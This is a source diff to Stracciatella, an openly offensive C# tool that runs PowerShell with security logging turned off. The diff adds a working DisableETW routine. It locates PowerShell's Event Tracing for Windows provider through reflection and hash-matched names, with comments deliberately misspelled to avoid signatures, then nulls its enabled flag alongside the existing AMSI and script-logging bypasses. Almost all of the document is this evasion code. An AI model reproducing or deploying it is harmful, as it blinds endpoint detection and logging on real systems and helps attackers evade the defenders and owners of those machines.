@@ -69,9 +69,9 @@ namespace Stracciatella
         private static void PrintBanner()
         {
             Console.WriteLine("");
-            Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.");
+            Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI, ETW and Script Block Logging disabled.");
             Console.WriteLine("  Mariusz Banach / mgeeky, '19-22 <mb@binary-offensive.com>");
-            Console.WriteLine("  v0.6");
+            Console.WriteLine("  v0.7");
             Console.WriteLine("");
         }
 
@@ -374,6 +374,15 @@ namespace Stracciatella
                 Info("[-] AMSI not disabled.");
             }
 
+            if ((ret &= DisableETW(rs)))
+            {
+                Info("[+] ETW Disabled.");
+            }
+            else
+            {
+                Info("[-] ETW not disabled.");
+            }
+
             Info("");
 
             return ret;
@@ -451,6 +460,80 @@ namespace Stracciatella
             }
 
             return false;
+        }
+
+        public static bool DisableETW(PowerShell rs)
+        {
+            // Based on https://gist.githubusercontent.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32/raw/115d0c513d041243a06a764546fd57e7c2f5e47e/KillETW.ps1
+            try
+            {
+                AppDomain currentDomain = AppDomain.CurrentDomain;
+                Assembly[] assems = currentDomain.GetAssemblies();
+
+                object prov = null;
+
+                foreach (Assembly assem in assems)
+                {
+                    var s = assem.Location.Split('\\').Last();
+                    var h = GetHash(s);
+
+                    if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // System.ManaXgement.Automation
+                    {
+                        Type[] types = assem.GetTypes();
+                        foreach (var tp in types)
+                        {
+                            if (GetHash(tp.Name) == 21880115877) // PSEtwLXogProvider
+                            {
+                                var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
+                                foreach (var f in fields)
+                                {
+                                    if (GetHash(f.Name) == 13746501952) // etwPXrovider
+                                    {
+                                        prov = f.GetValue(null);
+                                        break;
+                                    }
+                                }
+                            }
+
+                            if (prov != null) break;
+                        }
+                    }
+
+                    if (prov != null) break;
+                }
+
+                if (prov == null) return false;
+
+                foreach (Assembly assem in assems)
+                {
+                    if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 29479554155) // SystXem.Core.dll
+                    {
+                        Type[] types = assem.GetTypes();
+                        foreach (var tp in types)
+                        {
+                            if (GetHash(tp.Name) == 26304812882) // EventPrXovider
+                            {
+                                var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Instance);
+                                foreach (var f in fields)
+                                {
+                                    if (GetHash(f.Name) == 15534322620) // m_enXabled
+                                    {
+                                        f.SetValue(prov, null);
+                                        return true;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+
+                return false;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[!] Could not disable ETW. Unhandled exception occured:\n{e}");
+                return false;
+            }
         }
 
         public static bool DisableScriptLogging(PowerShell rs)
